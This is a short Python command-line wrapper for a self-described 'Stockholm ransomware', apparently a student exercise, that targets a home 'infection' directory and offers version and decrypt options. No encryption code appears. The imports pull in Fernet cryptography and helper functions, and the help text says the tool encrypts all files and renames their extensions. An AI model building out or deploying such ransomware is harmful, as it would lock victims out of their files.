#!/usr/bin/env python3
import argparse
from distutils.command.clean import clean
from email import parser
from multiprocessing.connection import wait
import os
from time import sleep
from cryptography.fernet import Fernet
from getpass import getuser
from text_art import stockholm, rev_stockholm, decrypting, encrypting, lil_stockholm, automatize_reverse, salecler


# Target default directory
user = getuser()
userdir = '/home/'+user
default_dir = '/home'+user+'infection'
files = []

# Main
def main_exec():
    parser = argparse.ArgumentParser(
        description= """ *** STOCKHOLM RANSOMWARE ***
        
        Encrypt and decrypt all files and subdirectories.
        It also change the extension of each file.
        *** WARNING: This program was written for educational purposes.  
        The responsibility for the use and distribution of the tool lies with 
        the user. Use it at your own risk and enjoy! - salecler """
    )
   # Version mode
    parser.add_argument('-v', '--version', action='store_true', help="show program's version.")
    # Reverse mode
    parser.add_argument('-r', '--reverse', action='store_true', help="decrypt all files and directories and change back extension's name.")

    args = parser.parse_args()

    if args.version == True:
        os.system("clear")
        print(lil_stockholm)
        print("Version 1.1 - ", salecler)
    if args.reverse == True:
        automatize_reverse()

    
#Main execution
if __name__ == "__main__":
    main_exec()